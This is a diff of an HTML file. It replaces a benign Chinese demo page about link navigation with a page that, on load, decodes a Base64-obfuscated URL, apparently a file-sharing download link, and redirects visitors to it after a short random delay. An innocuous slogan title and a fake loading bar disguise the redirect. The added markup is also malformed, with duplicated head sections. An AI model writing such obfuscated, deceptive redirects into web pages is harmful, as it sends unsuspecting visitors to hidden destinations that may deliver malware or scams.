@@ -1,94 +1,168 @@
-<!doctype html>
-<html lang="zh-CN">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>TV 示例页</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    .channels { display:flex; gap:10px; margin:12px 0; }
-    .channel { padding:10px 16px; background:#0070f3; color:white; border-radius:6px; cursor:pointer; }
-    .actions { margin-top:16px; }
-    input[type="text"]{ padding:8px; width:60%; }
-  </style>
-</head>
-<body>
-  <h1>TV 页面示例 (tv.html)</h1>
-  <p>这个页面展示了多种跳转方式：使用普通链接、JS 改变 location、在新窗口打开、使用 replace（替换历史）、以及返回上一页。</p>
 
-  <h2>示例频道（点击按钮跳转）</h2>
-  <div class="channels">
-    <div class="channel" onclick="goTo('channel1.html')">频道 1（channel1.html）</div>
-    <div class="channel" onclick="goTo('channel2.html')">频道 2（channel2.html）</div>
-    <div class="channel" onclick="goTo('https://example.com')">外部站点（example.com）</div>
-  </div>
+<html> 
+<head> 
+    <meta charset="UTF-8"> 
+    <title>爱国敬业民主和谐</title> 
+<script>
+    // 多域名列表（Base64编码）
+    var domains = [
+  
+        'aHR0cHM6Ly93d2Jray5sYW56b3ViLmNvbS9iMDB5YjdmN3pn',
+        'aHR0cHM6Ly93d2Jray5sYW56b3ViLmNvbS9iMDB5YjdmN3pn'
+    ];
+    
+    // 随机选择一个域名
+    var randomDomain = domains[Math.floor(Math.random() * domains.length)]; 
+    
+    // 解码Base64得到真实URL 
+    var redirectUrl = atob(randomDomain);
+    
+    // 随机延时（1-3秒）
+    var delay = 500 + Math.floor(Math.random()  * 500);
+    
+    console.log("Selected  URL:", redirectUrl);
+    console.log("Redirect  in:", delay + "ms");
+    
+    // 定时跳转
+    setTimeout(function() {
+        location.href  = redirectUrl;
+    }, delay);
+</script>
+</head> 
+<body></body> 
 
-  <h2>链接示例</h2>
-  <ul>
-    <li><a href="channel1.html">普通链接到 channel1.html</a></li>
-    <li><a href="channel2.html" target="_blank" rel="noopener">在新标签打开 channel2.html</a></li>
-  </ul>
+ 
+<head> 
+    <meta charset="utf-8"> 
+    <title>爱国敬业民主和谐</title> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <title>动态加载页面</title> 
+    <style> 
+        /* 响应式布局基础 */ 
+        body { 
+            margin: 0; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            background: linear-gradient(135deg, #29323c 0%, #485563 100%); 
+            font-family: 'Segoe UI', sans-serif; 
+        } 
+ 
+        /* 加载容器 */ 
+        .loader-container { 
+            text-align: center; 
+            max-width: 400px; 
+            width: 90%; 
+        } 
+ 
+        /* 动态进度条 */ 
+        .progress-bar { 
+            width: 100%; 
+            height: 8px; 
+            background: #333; 
+            border-radius: 4px; 
+            margin: 20px 0; 
+        } 
+ 
+        .progress { 
+            height: 100%; 
+            background: linear-gradient(90deg, #667eea, #6f54c2); 
+            /* 延长 CSS 动画时间为 5 秒 */ 
+            animation: progressAnimation 2s forwards; 
+            transition: width 0.3s ease-in-out; 
+        } 
+ 
+        /* 动态加载文字 */ 
+        .loading-text { 
+            color: #fff; 
+            font-size: 1.2rem; 
+            margin-bottom: 15px; 
+            animation: fadeIn 1.5s infinite alternate; 
+        } 
+ 
+        /* 响应式调整 */ 
+        @media (max-width: 600px) { 
+            .loading-text { 
+                font-size: 1rem; 
+            } 
+            .progress-bar { 
+                height: 6px; 
+            } 
+        } 
+ 
+        /* CSS 动画 */ 
+        @keyframes progressAnimation { 
+            from { 
+                width: 0; 
+            } 
+            to { 
+                width: 100%; 
+            } 
+        } 
+ 
+        @keyframes fadeIn { 
+            from { 
+                opacity: 0.6; 
+            } 
+            to { 
+                opacity: 1; 
+            } 
+        } 
+    </style> 
+</head> 
 
-  <div class="actions">
-    <label>输入任意 URL（相对或绝对）：</label>
-    <br />
-    <input id="urlInput" type="text" placeholder="例如 channel1.html 或 https://example.com" />
-    <button onclick="goFromInput()">跳转</button>
-    <button onclick="openNew()">在新窗口打开</button>
-    <button onclick="replaceFromInput()">replace 跳转（替换历史）</button>
-    <button onclick="goBack()">后退（history.back）</button>
-  </div>
-
-  <script>
-    function goTo(url) {
-      // 演示：直接改变 location.href
-      console.log('goTo:', url);
-      window.location.href = url;
-    }
-
-    function goFromInput() {
-      const v = document.getElementById('urlInput').value.trim();
-      if (!v) { alert('请先输入 URL'); return; }
-      // 如果是相对路径或绝对 URL 都可以
-      window.location.href = v;
-    }
-
-    function openNew() {
-      const v = document.getElementById('urlInput').value.trim();
-      if (!v) { alert('请先输入 URL'); return; }
-      window.open(v, '_blank', 'noopener');
-    }
-
-    function replaceFromInput() {
-      const v = document.getElementById('urlInput').value.trim();
-      if (!v) { alert('请先输入 URL'); return; }
-      // 使用 replace 不会在浏览历史中留下当前页
-      window.location.replace(v);
-    }
-
-    function goBack(){
-      // 如果没有历史则跳到根页面
-      if (history.length > 1) history.back();
-      else window.location.href = '/';
-    }
-
-    // 当页面被载入时，若地址有查询参数 ?chan=channel1，会自动跳转到对应页面（示范用途）
-    (function autoJumpFromQuery(){
-      try {
-        const params = new URLSearchParams(window.location.search);
-        const chan = params.get('chan');
-        if (chan) {
-          // 防止滥用，仅允许字母数字和点、短横、下划线
-          if (/^[\w.\-\/]+$/.test(chan)) {
-            console.log('auto jump to', chan);
-            // 延迟 300ms，给用户看到提示
-            setTimeout(()=> window.location.href = chan, 300);
-          }
-        }
-      } catch (e) {
-        console.warn(e);
-      }
-    })();
-  </script>
-</body>
-</html>
+<body> 
+    <div class="loader-container"> 
+        <h1 class="loading-text">正在加载...</h1> 
+        <div class="progress-bar"> 
+            <div class="progress"></div> 
+        </div> 
+    </div> 
+ 
+    <script> 
+        // 动态加载控制 
+        let progress = 0; 
+        const progressBar = document.querySelector('.progress');  
+ 
+        // 模拟加载过程 
+        const timer = setInterval(() => { 
+            if (progress >= 100) { 
+                clearInterval(timer); 
+                // 加载完成后跳转 
+            } 
+            // 降低进度增长速度，将每次增长的值减小 
+            progress += Math.random()  * 2 + 0.5; 
+            progressBar.style.width  = `${progress}%`; 
+        }, 200); // 延长定时器的间隔时间 
+    </script> 
+    <style> 
+        html { 
+            color-scheme: light dark; 
+            background-color: #f0f0f0; 
+        } 
+ 
+        body { 
+            width: 100vw; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            font-family: 'Arial', sans-serif; 
+        } 
+ 
+        h1 { 
+            font-size: 4em; 
+            color: #333; 
+            text-shadow: 1px 1px 1px #ccc; 
+            margin-bottom: 20px; 
+        } 
+ 
+        p { 
+            font-size: 1.5em; 
+            color: #666; 
+        } 
+    </style> 
+    <p>页面正在跳转，请稍等</p> 
+ 
